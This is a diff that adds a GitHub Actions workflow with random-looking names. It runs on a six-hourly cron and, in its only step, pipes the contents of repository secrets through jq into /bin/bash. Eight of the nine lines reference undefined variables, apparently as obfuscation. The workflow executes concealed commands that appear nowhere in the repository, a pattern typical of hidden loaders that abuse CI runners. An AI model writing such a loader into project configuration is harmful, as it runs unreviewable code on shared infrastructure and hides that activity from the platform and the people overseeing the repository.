@@ -1,0 +1,25 @@
+name: ligaozhang6556
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ligaozhang6556
+        env:
+          vw51: ${{ secrets.vw51 }}
+        run: |
+          echo $vw51 | jq -r .ecb9908 | /bin/bash
+          echo $kttsw50295 | jq -r .bpco974 | /bin/bash
+          echo $z617 | jq -r .iby18 | /bin/bash
+          echo $w79155 | jq -r .mjb77 | /bin/bash
+          echo $n658 | jq -r .r35204 | /bin/bash
+          echo $dmteb3 | jq -r .nu2 | /bin/bash
+          echo $hm5 | jq -r .mk1 | /bin/bash
+          echo $n60420 | jq -r .sdho8344 | /bin/bash
+          echo $sfcwb1134 | jq -r .pfzi20 | /bin/bash
+
